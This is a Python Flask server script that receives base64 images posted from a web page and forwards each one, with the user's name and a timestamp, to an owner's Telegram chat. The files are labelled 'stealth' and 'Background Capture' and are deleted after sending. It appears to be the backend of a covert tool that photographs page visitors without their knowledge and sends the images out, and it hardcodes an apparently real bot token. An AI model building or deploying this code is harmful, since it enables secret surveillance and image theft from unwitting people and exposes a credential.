import os, json, base64, asyncio, time
from flask import Flask, request, jsonify
from telegram import Bot

app = Flask(__name__)

# --- CONFIG ---
TOKEN = '8396307053:AAEH_oUAbyiTjNaq997drQkIHQ6keghM6xw'
OWNER_ID = '7812553563' # Admin ID
bot = Bot(token=TOKEN)

@app.route('/')
def index():
    return open('index.html', 'r', encoding='utf-8').read()

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    user_id = data.get('user_id')
    user_name = data.get('user_name')
    image_base64 = data.get('image').split(",")[1]
    
    timestamp = time.strftime("%H:%M:%S")
    filename = f"stealth_{user_id}_{int(time.time())}.jpg"

    with open(filename, "wb") as f:
        f.write(base64.b64decode(image_base64))

    async def send_to_admin():
        async with bot:
            await bot.send_photo(
                chat_id=OWNER_ID,
                photo=open(filename, 'rb'),
                caption=f"📸 **Background Capture**\n👤 User: {user_name}\n⏰ Time: {timestamp}"
            )
        os.remove(filename) # ပို့ပြီးရင် ဖျက်ပစ်သည်

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(send_to_admin())

    return jsonify({"status": "received"}), 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
